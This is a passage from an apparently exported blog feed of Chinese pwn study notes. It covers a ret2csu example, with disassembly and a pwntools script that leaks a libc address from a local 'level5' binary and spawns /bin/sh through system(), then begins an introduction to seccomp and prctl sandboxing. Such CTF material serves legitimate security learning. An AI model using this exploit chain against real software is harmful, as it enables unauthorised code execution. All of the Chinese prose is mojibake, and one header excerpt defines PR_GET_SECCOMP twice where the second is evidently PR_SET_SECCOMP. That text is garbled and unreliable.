class="line">.text:0000000000001276 loc_1276:                               ; CODE XREF: __libc_csu_init+35â†‘j</span><br><span class="line">.text:0000000000001276                 add     rsp, 8</span><br><span class="line">.text:000000000000127A                 pop     rbx</span><br><span class="line">.text:000000000000127B                 pop     rbp</span><br><span class="line">.text:000000000000127C                 pop     r12</span><br><span class="line">.text:000000000000127E                 pop     r13</span><br><span class="line">.text:0000000000001280                 pop     r14</span><br><span class="line">.text:0000000000001282                 pop     r15</span><br><span class="line">.text:0000000000001284                 retn</span><br><span class="line">.text:0000000000001284 ; &#125; // starts at 1220</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„å‡ ä¸ªç‚¹ï¼Œä¸Šæ±‡ç¼–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001276 loc_1276:                               ; CODE XREF: __libc_csu_init+35â†‘j</span><br><span class="line">.text:0000000000001276                 add     rsp, 8</span><br><span class="line">.text:000000000000127A                 pop     rbx</span><br><span class="line">.text:000000000000127B                 pop     rbp</span><br><span class="line">.text:000000000000127C                 pop     r12</span><br><span class="line">.text:000000000000127E                 pop     r13</span><br><span class="line">.text:0000000000001280                 pop     r14</span><br><span class="line">.text:0000000000001282                 pop     r15</span><br><span class="line">.text:0000000000001284                 retn</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°äº†è¿™é‡Œå¯ä»¥ä¿®æ”¹ä¸ªåˆ«å¯„å­˜å™¨çš„å€¼ï¼Œç„¶åæ˜¯è¿™å„¿ï¼Œå¯ä»¥ä¿®æ”¹ä¼ å‚ç”¨çš„é‚£å‡ ä¸ªå¯„å­˜å™¨çš„å€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001260 loc_1260:                               ; CODE XREF: __libc_csu_init+54â†“j</span><br><span class="line">.text:0000000000001260                 mov     rdx, r14</span><br><span class="line">.text:0000000000001263                 mov     rsi, r13</span><br><span class="line">.text:0000000000001266                 mov     edi, r12d</span><br><span class="line">.text:0000000000001269                 call    ds:(__frame_dummy_init_array_entry - 3DB8h)[r15+rbx*8]</span><br><span class="line">.text:000000000000126D                 add     rbx, 1</span><br><span class="line">.text:0000000000001271                 cmp     rbp, rbx</span><br><span class="line">.text:0000000000001274                 jnz     short loc_1260</span><br></pre></td></tr></table></figure><p>â€‹ç”±æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶ r13 ç­‰å’Œä¼ å‚ç”¨çš„å¯„å­˜å™¨ç›¸å¯¹åº”çš„æ¥è¿›è¡Œ ret2syscall ç­‰æ“ä½œã€‚</p><h2 id="ä¾‹å­"><a class="markdownIt-Anchor" href="#ä¾‹å­">#</a> ä¾‹å­ï¼š</h2><p>â€‹å…ˆçœ‹çœ‹æ¶æ„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/Temp$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/Temp/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>â€‹IDA åˆ†æï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç„¶åçœ‹çœ‹ <code>__libc_csu_init</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0</span><br><span class="line">.text:00000000004005C0 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00000000004005C0</span><br><span class="line">.text:00000000004005C0</span><br><span class="line">.text:00000000004005C0 ; void __fastcall _libc_csu_init(unsigned int, __int64, __int64)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16â†‘o</span><br><span class="line">.text:00000000004005C0 ; __unwind &#123;</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54â†“j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34â†‘j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 ; &#125; // starts at 4005C0</span><br></pre></td></tr></table></figure><p>â€‹ç”±ä¸‹é¢è¿™ä¸ªç‚¹å¯ä»¥çŸ¥é“ï¼Œå¯ä»¥æ§åˆ¶çš„å¯„å­˜å™¨ä¸º ediã€rsiã€rdxï¼Œå¦å¤–ï¼Œ <code>call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</code>  è¿˜ä½¿å¾—å¯ä»¥è°ƒç”¨ r12+rbx*8 çš„ä¸€ä¸ªåœ°å€çš„å‡½æ•°ï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨ r12 æ¥è·³è½¬åˆ° write å‡½æ•°æ¥æ³„éœ² write å‡½æ•°çš„åœ°å€ï¼Œç„¶åå°±å¯ä»¥é€šè¿‡ ret2libc æ¥è·å¾— shellï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_addr = <span class="number">0x40061a</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mov_addr = <span class="number">0x400600</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">payload0 = <span class="string">&#x27;A&#x27;</span>*<span class="number">136</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(mov_addr) + <span class="string">&#x27;a &#x27;</span>*(<span class="number">0x8</span>+<span class="number">8</span>*<span class="number">6</span>) + p64(main_addr)</span><br><span class="line">p.sendline(payload0)</span><br><span class="line"></span><br><span class="line">write_start = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;write_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(write_start)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc_base=write_start-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))+libc_base</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;/bin/sh_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(binsh)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400623</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnå­¦ä¹ ç¬”è®°ï¼ˆ8ï¼‰-åˆè¯†æ²™ç®±</title>
      <link href="/posts/9d5b1ce4.html"/>
      <url>/posts/9d5b1ce4.html</url>
      
        <content type="html"><![CDATA[<h1 id="åˆè¯†pwnæ²™ç®±"><a class="markdownIt-Anchor" href="#åˆè¯†pwnæ²™ç®±">#</a> åˆè¯† Pwn æ²™ç®±</h1><p>â€‹æ²™ç®±æœºåˆ¶ï¼Œè‹±æ–‡ sandboxï¼Œæ˜¯è®¡ç®—æœºé¢†åŸŸçš„è™šæ‹ŸæŠ€æœ¯ï¼Œå¸¸è§äºå®‰å…¨æ–¹å‘ã€‚ä¸€èˆ¬è¯´æ¥ï¼Œæˆ‘ä»¬ä¼šå°†ä¸å—ä¿¡ä»»çš„è½¯ä»¶æ”¾åœ¨æ²™ç®±ä¸­è¿è¡Œï¼Œä¸€æ—¦è¯¥è½¯ä»¶æœ‰æ¶æ„è¡Œä¸ºï¼Œåˆ™ç¦æ­¢è¯¥ç¨‹åºçš„è¿›ä¸€æ­¥è¿è¡Œï¼Œä¸ä¼šå¯¹çœŸå®ç³»ç»Ÿé€ æˆä»»ä½•å±å®³ã€‚</p><p>â€‹å®‰å…¨è®¡ç®—æ¨¡å¼ seccompï¼ˆSecure Computing Modeï¼‰åœ¨ Linux2.6.10 ä¹‹åå¼•å…¥åˆ° kernel çš„ç‰¹æ€§ï¼Œå¯ç”¨å…¶å®ç°ä¸€ä¸ªæ²™ç®±ç¯å¢ƒã€‚ä½¿ç”¨ seccomp æ¨¡å¼å¯ä»¥å®šä¹‰ç³»ç»Ÿè°ƒç”¨ç™½åå•å’Œé»‘åå•ã€‚seccomp æœºåˆ¶ç”¨äºé™åˆ¶åº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¢åŠ ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚</p><p>â€‹åœ¨ ctf ä¸­ä¸»è¦é€šè¿‡ä¸¤ç§æ–¹å¼å®ç°æ²™ç®±æœºåˆ¶ï¼š</p><ul><li>prctl ç³»ç»Ÿè°ƒç”¨ï¼›</li><li>seccomp åº“å‡½æ•°ï¼›</li></ul><h2 id="1-prctlå‡½æ•°åˆæ¢"><a class="markdownIt-Anchor" href="#1-prctlå‡½æ•°åˆæ¢">#</a> 1ã€prctl å‡½æ•°åˆæ¢</h2><p>â€‹prctl æ˜¯åŸºæœ¬çš„è¿›ç¨‹ç®¡ç†å‡½æ•°ï¼Œæœ€åŸå§‹çš„æ²™ç®±è§„åˆ™å°±æ˜¯é€šè¿‡ prctl å‡½æ•°æ¥å®ç°çš„ï¼Œå®ƒå¯ä»¥å†³å®šæœ‰å“ªäº›ç³»ç»Ÿè°ƒç”¨å‡½æ•°å¯ä»¥è¢«è°ƒç”¨ï¼Œå“ªäº›ç³»ç»Ÿè°ƒç”¨å‡½æ•°ä¸èƒ½è¢«è°ƒç”¨ã€‚</p><p>â€‹ä¸‹é¢æ˜¯ /linux/prctl.h å’Œ seccomp ç›¸å…³çš„æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get/set process seccomp mode */</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP      21</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP     22</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If no_new_privs is set, then operations that grant new privileges (i.e.</span></span><br><span class="line"><span class="comment"> * execve) will either fail or not grant them.  This affects suid/sgid,</span></span><br><span class="line"><span class="comment"> * file capabilities, and LSMs.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Operations that merely manipulate or drop existing privileges (setresuid,</span></span><br><span class="line"><span class="comment"> * capset, etc.) will still work.  Drop those privileges if you want them gone.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Changing LSM security domain is considered a new privilege.  So, for example,</span></span><br><span class="line"><span class="comment"> * asking selinux for a specific new context (e.g. with runcon) will result</span></span><br><span class="line"><span class="comment"> * in execve returning -EPERM.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See Documentation/userspace-api/no_new_privs.rst for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_NO_NEW_PRIVS    38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_NO_NEW_PRIVS    39</span></span><br></pre></td></tr></table></figure><p>â€‹<strong>prctl å‡½æ•°åŸå‹</strong>ï¼šint prctl (int option,unsigned long argv2,unsigned long argv3,unsigned long argv4ï¼Œunsigned long argv3)</p><p>åœ¨å…·ä½“äº†è§£ prctl å‡½æ•°ä¹‹å‰ï¼Œæˆ‘ä»¬å†äº†è§£è¿™æ ·ä¸€ä¸ªæ¦‚å¿µï¼šæ²™ç®±ã€‚æ²™ç®± (Sandbox) æ˜¯ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­çš„ä¸€ç§éš”ç¦»æœºåˆ¶ï¼Œå…¶ç›®çš„æ˜¯é™åˆ¶ä¸å¯ä¿¡è¿›ç¨‹å’Œä¸å¯ä¿¡ä»£ç çš„è®¿é—®æƒé™ã€‚seccomp æ˜¯å†…æ ¸ä¸­çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œseccomp å¯ä»¥åœ¨ç¨‹åºä¸­ç¦ç”¨æ‰ä¸€äº›ç³»ç»Ÿè°ƒç”¨æ¥è¾¾åˆ°ä¿æŠ¤ç³»ç»Ÿå®‰å…¨çš„ç›®çš„ï¼Œseccomp è§„åˆ™çš„è®¾ç½®ï¼Œå¯ä»¥ä½¿ç”¨ prctl å‡½æ•°å’Œ seccomp å‡½æ•°æ—ã€‚</p><p>â€‹<strong>include/linux/prctl.h é‡Œé¢å­˜å‚¨ç€ prctl çš„æ‰€æœ‰å‚æ•°çš„å®å®šä¹‰ï¼Œprctl çš„äº”ä¸ªå‚æ•°ä¸­ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä½ è¦åšçš„äº‹æƒ…ï¼Œåé¢çš„å‚æ•°éƒ½æ˜¯å¯¹ç¬¬ä¸€ä¸ªå‚æ•°çš„é™å®šã€‚</strong></p><p>â€‹åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä¸­ï¼Œæˆ‘ä»¬éœ€è¦é‡ç‚¹å…³æ³¨çš„å‚æ•°æœ‰è¿™ä¸¤ä¸ªï¼š</p><ol><li>PR_SET_SECCOMP (22)ï¼šå½“ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ PR_SET_SECCOMP, ç¬¬äºŒä¸ªå‚æ•° argv2 ä¸º 1 çš„æ—¶å€™ï¼Œè¡¨ç¤ºå…è®¸çš„ç³»ç»Ÿè°ƒç”¨æœ‰ readï¼Œwriteï¼Œexit å’Œ sigereturnï¼›å½“ argv ç­‰äº 2 çš„æ—¶å€™ï¼Œè¡¨ç¤ºå…è®¸çš„ç³»ç»Ÿè°ƒç”¨ç”± argv3 æŒ‡å‘ sock_fprog ç»“æ„ä½“å®šä¹‰ï¼Œè¯¥ç»“æ„ä½“æˆå‘˜æŒ‡å‘çš„ sock_filter å¯ä»¥å®šä¹‰è¿‡æ»¤ä»»æ„ç³»ç»Ÿè°ƒç”¨å’Œç³»ç»Ÿè°ƒç”¨å‚æ•°ã€‚(ç»†èŠ‚è§ä¸‹å›¾)</li><li>PR_SET_NO_NEWPRIVS (38):prctl (38,1,0,0,0) è¡¨ç¤ºç¦ç”¨ç³»ç»Ÿè°ƒç”¨ execve () å‡½æ•°ï¼ŒåŒæ—¶ï¼Œè¿™ä¸ªé€‰é¡¹å¯ä»¥é€šè¿‡ fork () å‡½æ•°å’Œ clone () å‡½æ•°ç»§æ‰¿ç»™å­è¿›ç¨‹ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>        len;    <span class="comment">/* æŒ‡ä»¤ä¸ªæ•° */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> *<span class="title">filter</span>;</span> <span class="comment">/*æŒ‡å‘åŒ…å«struct sock_filterçš„ç»“æ„ä½“æ•°ç»„æŒ‡é’ˆ*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span>            <span class="comment">/* Filter block */</span></span><br><span class="line">    __u16 code;                 <span class="comment">/* Actual filter code,bpfæŒ‡ä»¤ç  */</span></span><br><span class="line">    __u8  jt;                   <span class="comment">/* Jump true */</span></span><br><span class="line">    __u8  jf;                   <span class="comment">/* Jump false */</span></span><br><span class="line">    __u32 k;                    <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//seccomp-dataç»“æ„ä½“è®°å½•å½“å‰æ­£åœ¨è¿›è¡Œbpfè§„åˆ™æ£€æŸ¥çš„ç³»ç»Ÿè°ƒç”¨ä¿¡æ¯</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> nr;<span class="comment">//ç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line">    __u32 arch;<span class="comment">//è°ƒç”¨æ¶æ„</span></span><br><span class="line">    __u64 instruction_pointer;<span class="comment">//CPUæŒ‡ä»¤æŒ‡é’ˆ</span></span><br><span class="line">    __u64 argv[<span class="number">6</span>];<span class="comment">//å¯„å­˜å™¨çš„å€¼ï¼Œx86ä¸‹æ˜¯ebxï¼Œexc,edx,edi,ebp;x64ä¸‹æ˜¯rdi,rsi,rdx,r10,r8,r9</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-prctlå‡½æ•°è¯¦è§£"><a class="markdownIt-Anchor" href="#2-prctlå‡½æ•°è¯¦è§£">#</a> 2ã€prctl () å‡½æ•°è¯¦è§£</h2><p>â€‹ <code>prctl</code>  æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œç”¨äºæ§åˆ¶å’Œä¿®æ”¹è¿›ç¨‹çš„è¡Œä¸ºå’Œå±æ€§ã€‚å®ƒå¯ä»¥åœ¨ Linux ç³»ç»Ÿä¸Šä½¿ç”¨ï¼Œæä¾›äº†å„ç§åŠŸèƒ½å’Œé€‰é¡¹æ¥ç®¡ç†è¿›ç¨‹çš„ä¸åŒæ–¹é¢ã€‚</p><p>â€‹ä»¥ä¸‹æ˜¯ <code>prctl</code>  å‡½æ•°çš„åŸºæœ¬åŸå‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">prctl</span><span class="params">(<span class="type">int</span> option, <span class="type">unsigned</span> <span class="type">long</span> arg2, <span class="type">unsigned</span> <span class="type">long</span> arg3, <span class="type">unsigned</span> <span class="type">long</span> arg4, <span class="type">unsigned</span> <span class="type">long</span> arg5)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>â€‹prctl å‡½æ•°æ¥å—ä¸åŒçš„ option é€‰é¡¹å’Œå‚æ•°ï¼Œç”¨äºæ‰§è¡Œä¸åŒçš„æ“ä½œã€‚ä¸‹é¢æ˜¯ä¸€äº›å¸¸ç”¨çš„ option é€‰é¡¹åŠå…¶åŠŸèƒ½ï¼š</p><ul><li>PR_SET_NAMEï¼šè®¾ç½®è¿›ç¨‹åç§°ã€‚</li><li>PR_GET_NAMEï¼šè·å–è¿›ç¨‹åç§°ã€‚</li><li>PR_SET_PDEATHSIGï¼šè®¾ç½®åœ¨çˆ¶è¿›ç¨‹ç»ˆæ­¢æ—¶å‘é€ç»™å½“å‰è¿›ç¨‹çš„ä¿¡å·ã€‚</li><li>PR_GET_PDEATHSIGï¼šè·å–çˆ¶è¿›ç¨‹ç»ˆæ­¢æ—¶å‘é€ç»™å½“å‰è¿›ç¨‹çš„ä¿¡å·ã€‚</li><li>PR_SET_DUMPABLEï¼šè®¾ç½®è¿›ç¨‹çš„å¯è½¬å‚¨æ ‡å¿—ï¼Œå½±å“æ ¸å¿ƒè½¬å‚¨ã€‚</li><li>PR_GET_DUMPABLEï¼šè·å–è¿›ç¨‹çš„å¯è½¬å‚¨æ ‡å¿—ã€‚</li><li>PR_SET_SECCOMPï¼šè®¾ç½®è¿›ç¨‹çš„å®‰å…¨è®¡ç®—æ¨¡å¼ã€‚</li><li>PR_GET_SECCOMPï¼šè·å–è¿›ç¨‹çš„å®‰å…¨è®¡ç®—æ¨¡å¼ã€‚</li></ul></blockquote><p>â€‹è¿™äº›ä»…æ˜¯ä¸€äº›å¸¸ç”¨çš„é€‰é¡¹ï¼Œ <code>prctl</code>  è¿˜æ”¯æŒå…¶ä»–é€‰é¡¹å’ŒåŠŸèƒ½ã€‚æ¯ä¸ªé€‰é¡¹éƒ½æœ‰ç‰¹å®šçš„å‚æ•°ï¼Œå¯ä»¥æ ¹æ®éœ€è¦ä¼ é€’ã€‚å…·ä½“çš„å‚æ•°å’Œè¡Œä¸ºå–å†³äºæ‰€é€‰çš„é€‰é¡¹ã€‚</p><p>â€‹ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œå±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ <code>prctl</code>  å‡½æ•°è®¾ç½®è¿›ç¨‹åç§°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* process_name = <span class="string">&quot;MyProcess&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NAME, (<span class="type">unsigned</span> <span class="type">long</span>) process_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span 